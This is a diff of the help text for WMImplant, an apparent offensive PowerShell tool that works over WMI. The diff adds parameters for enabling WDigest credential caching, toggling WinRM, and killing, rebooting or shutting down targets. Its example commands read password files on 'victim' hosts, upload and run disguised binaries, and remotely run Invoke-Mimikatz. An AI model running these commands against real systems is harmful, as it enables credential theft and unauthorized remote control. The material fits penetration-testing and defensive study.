@@ -1985,24 +1985,27 @@ function Invoke-WMImplant
     .DESCRIPTION
     This is the main WMImplant function.  When calling Invoke-WMImplant you will be presented with the main menu.
 
+    .DESCRIPTION
+    This parameter is used to start WMImplant in an interactive manner. This is done by default, unless specifying a command
+
     .PARAMETER RemoteUser
     Specify a username. Default is the current user context.  This user is used to connect to remote systems.
 
     .PARAMETER RemotePass
     Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.
 
-    .PARAMETER Command
-    If using the CLI, specify the command that you want to use.
-
     .PARAMETER ListCommands
     List the available commands within WMImplant.
 
     .PARAMETER LocalFile
-    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally).
+    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally), or when saving event log information locally.
 
     .PARAMETER RemoteFile
     This parameter is used when user's need to provide the path to a file remotely for interaction (downloading a remote file or providing a path to upload a file to) or when needing to specify a directory (such as a directory where you want to list all its contents).
     
+    .PARAMETER RemoteDirectory
+    This parameter is used when specifying a directory for listing its contents
+
     .PARAMETER RemoteDrive
     This parameter is used when you need to specify a drive to search on a remote system.
 
@@ -2015,14 +2018,26 @@ function Invoke-WMImplant
     .PARAMETER Target
     This parameter specifies the system to execute the WMImplant command on.
 
+    .PARAMETER Function
+    This parameter specifies the function to run when remotely running PowerShell
+
     .PARAMETER ProcessName
     This parameter specifies the process name when killing a process by name.
 
     .PARAMETER ProcessID
     This parameter specifies the process ID to use when killing a process by ID.
 
-    .PARAMETER ServiceAction
-    This parameter specifies if a service will be started, stopped, deleted, or created.
+    .PARAMETER ServiceStart
+    This parameter specifies that a service will be started.
+
+    .PARAMETER ServiceStop
+    This parameter specifies that a service will be stopped.
+
+    .PARAMETER ServiceCreate
+    This parameter specifies that a service will be create.
+
+    .PARAMETER ServiceDelete
+    This parameter specifies that a service will be deleted.
 
     .PARAMETER ServiceName
     This parameter specifies the name of the service when one is being created.
@@ -2042,11 +2057,89 @@ function Invoke-WMImplant
     .PARAMETER RegKey
     This parameter specifies the registry key that will be modified.
 
-    .PARAMETER RegValue
-    This parameter specifies the registry value that will be modified.
+    .PARAMETER RegSubKey
+    This parameter specifies the registry sub key that will be modified.
 
-    .PARAMETER RegData
+    .PARAMETER RegValue
     This parameter contains the data that's added to a registry value when it is created.
+
+    .PARAMETER KeyCreate
+    This parameter specifies that a registry key will be deleted.
+
+    .PARAMETER KeyDelete
+    This parameter specifies that a registry key will be created.
+
+    .PARAMETER Cat
+    This parameter specifies that WMImplant will read the contents of the specified file.
+
+    .PARAMETER Download
+    This parameter specifies that WMImplant will download a specified file.
+
+    .PARAMETER Upload
+    This parameter specifies that WMImplant will upload a specified file.
+
+    .PARAMETER CommandExec
+    This parameter specifies that WMImplant will run a command and return the output.
+
+    .PARAMETER DisableWDigest
+    This parameter specifies that WMImplant will remove the UseLogonCredential registry key from the targeted system.
+
+    .PARAMETER DisableWinRM
+    This parameter will have WMImplant attempt to force disable WinRM on the targeted system.
+
+    .PARAMETER EnableWdigest
+    This parameter will have WMImplant set the UseLogonCredential registry key on the targeted system
+
+    .PARAMETER EnableWinRM
+    This parameter will have WMImplant attempt to force enable WinRM on the targeted system.
+
+    .PARAMETER RemotePosh
+    This parameter will tell WMImplant to run a PowerShell command on the targeted system
+
+    .PARAMETER SetWMIDefault
+    This parameter sets the DebugFilePath property back to the default MS value.
+
+    .PARAMETER PS
+    This parameter specifies that WMImplant will perform a process listing on the targeted system
+
+    .PARAMETER ProcessKill
+    This parameter specifies that WMImplant will kill a process on the targeted system.
+
+    .PARAMETER ProcessStart
+    This parameter specifies that WMImplant will start a process on the targeted system.
+
+    .PARAMETER ActiveUsers
+    This parameter specifies that WMImplant will pull user accounts with active processes on the targeted system.
+
+    .PARAMETER BasicInfo
+    This parameter specifies that WMImplant will retrieve basic information about the targeted system.
+
+    .PARAMETER DriveList
+    This parameter specifies that WMImplant will pull a listing of drives from the targeted system.
+
+    .PARAMETER IFConfig
+    This parameter specifies that WMImplant will pull NICs with active connections on the targeted system.
+
+    .PARAMETER InstalledPrograms
+    This parameter directs WMImplant to retrieve a list of the programs installed on the targeted system.
+
+    .PARAMETER VacantSystem
+    This parameter directs WMImplant to try to determine if a user is active at the targeted system, or is they are afk.
+
+    .PARAMETER LogonEvents
+    This parameter directs WMImplant to pull a list of user accounts that log into the targeted system.
+
+    .PARAMETER LogOff
+    This paremeter directs WMImplant to log users off the targeted system.
+
+    .PARAMETER Reboot
+    This parameter directs WMImplant to reboot the targeted system.
+
+    .PARAMETER PowerOff
+    This parameter directs WMImplant to shut down the targeted system.
+
+    .PARAMETER Location
+    This parameter specifies the path to the PowerShell script you will run on the targeted system.
 
     .EXAMPLE
     > Invoke-WMImplant
@@ -2057,83 +2150,83 @@ function Invoke-WMImplant
     This will list all available commands supported within WMImplant.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -Target windowspc
+    > Invoke-WMImplant -Cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -Target windowspc
     This command uses the "cat" command, and attempts to read the secrets.txt file with the provided username and password on the windowspc system
 
     .EXAMPLE
-    > Invoke-WMImplant -Command cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -Target windowspc
+    > Invoke-WMImplant -Cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -Target windowspc
     This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system
 
     .EXAMPLE
-    > Invoke-WMImplant -Command upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows
+    > Invoke-WMImplant -Upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows
     This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -Target mysystem
+    > Invoke-WMImplant -Download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -Target mysystem
     This command attempts to download the file C:\passwords.txt on the remote system "mysystem" locally to C:\Users\Chris\Downloads\passwords.txt.  It authenticates to the remote machine (to download the file) using the current user's context, and then is downloaded localy.
     
     .EXAMPLE
-    > Invoke-WMImplant -Command ls -RemoteFile C:\Users\Chris\Downloads -Target win7computer
+    > Invoke-WMImplant -LS -RemoteFile C:\Users\Chris\Downloads -Target win7computer
     This command will get a directory list of all files within C:\Users\Chris\Downloads on the "win7computer" system under the current user's context.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command search -RemoteFile password.txt -Drive C: -Target chrispc -RemoteUser homedomain\Chris -RemotePass pass123
+    > Invoke-WMImplant -Search -RemoteFile password.txt -Drive C: -Target chrispc -RemoteUser homedomain\Chris -RemotePass pass123
     This command searches the remote system "chrispc" for any file called password.txt on the C drive and authenticates using the credentials provided.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command search -RemoteExtension sql -Drive C: -Target computer2
+    > Invoke-WMImplant -Search -RemoteExtension sql -Drive C: -Target computer2
     This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command remote_posh -Location C:\test.ps1 -Function Invoke-Mimikatz -Target win7sys -RemoteUser test\admin -Pass admin123
+    > Invoke-WMImplant -Remote_Posh -Location C:\test.ps1 -Function Invoke-Mimikatz -Target win7sys -RemoteUser test\admin -Pass admin123
     This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
     
     .EXAMPLE
-    > Invoke-WMImplant -Command ps -RemoteUser test\apple -RemotePass pass123 -Target hackerpc
+    > Invoke-WMImplant -PS -RemoteUser test\apple -RemotePass pass123 -Target hackerpc
     This command gets a process listing on the system "hackerpc" by authenticating as the apple user
 
     .EXAMPLE
-    > Invoke-WMImplant -Command process_kill -ProcessID 1194 -Target sys3
+    > Invoke-WMImplant -ProcessKill -ProcessID 1194 -Target sys3
     This command kills process id 1194 on the "sys3" system and authenticates with the current user's context
 
     .EXAMPLE
-    > Invoke-WMImplant -Command process_kill -ProcessName systemexplorer.exe -Target win7 -RemoteUser internal\admin -RemotePass pass123
+    > Invoke-WMImplant -ProcessKill -ProcessName systemexplorer.exe -Target win7 -RemoteUser internal\admin -RemotePass pass123
     This command kills the remote process "systemexplorer.exe" on the system "win7" and authenticates as the "admin" user.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command process_start -RemoteFile notepad.exe -Target victimsys
+    > Invoke-WMImplant -ProcessStart -RemoteFile notepad.exe -Target victimsys
     This command authenticates to the "victimsys" system under the current user's context and starts the process notepad.exe
 
     .EXAMPLE
-    > Invoke-WMImplant -Command process_start -RemoteFile C:\notabackdoor.exe -Target victim2 -RemoteUser inside\goodadmin -RemotePass pass222
+    > Invoke-WMImplant -ProcessStart -RemoteFile C:\notabackdoor.exe -Target victim2 -RemoteUser inside\goodadmin -RemotePass pass222
     This command authenticates to the "victim2" system as the user "goodadmin" and runs the binary located at C:\notabackdoor.exe
     
     .EXAMPLE
-    > Invoke-WMImplant -Command active_users -Target winadmin
+    > Invoke-WMImplant -ActiveUsers -Target winadmin
     This command displays any user that has a process running on the "winadmin" system via the current user's context
 
     .EXAMPLE
-    > Invoke-WMImplant -Command vacant_system -Target victim9 -RemoteUser owned\chris -RemotePass badpass
+    > Invoke-WMImplant -VacantSystem -Target victim9 -RemoteUser owned\chris -RemotePass badpass
     This command attempts to determine if a user is active at the "victim9" system by searching for active screensavers and a logon prompt and authenticates as the user "chris"
     
     .EXAMPLE
-    > Invoke-WMImplant -Command drive_list -Target victim101
+    > Invoke-WMImplant -DriveList -Target victim101
     This command authenticates to the victim101 system in the context of the current user and lists all drives connected to the system
 
     .EXAMPLE
-    > Invoke-WMImplant -Command reboot -Target victom3
+    > Invoke-WMImplant -Reboot -Target victom3
     This command reboots the "victom3" system
 
     .EXAMPLE
-    > Invoke-WMImplant -Command poweroff -Target victim9 -RemoteUser domain\user -RemotePass pass123
+    > Invoke-WMImplant -PowerOff -Target victim9 -RemoteUser domain\user -RemotePass pass123
     This command powers off the "victim9" and authenticates as the provided user and password.
     
     .EXAMPLE
-    > Invoke-WMImplant -Command registry_mod -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
+    > Invoke-WMImplant -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
     This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
 
     .EXAMPLE
-    > Invoke-WMImplant -command registry_mod -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -Target Win7user4
+    > Invoke-WMImplant -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -Target Win7user4
     This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
     #>
 
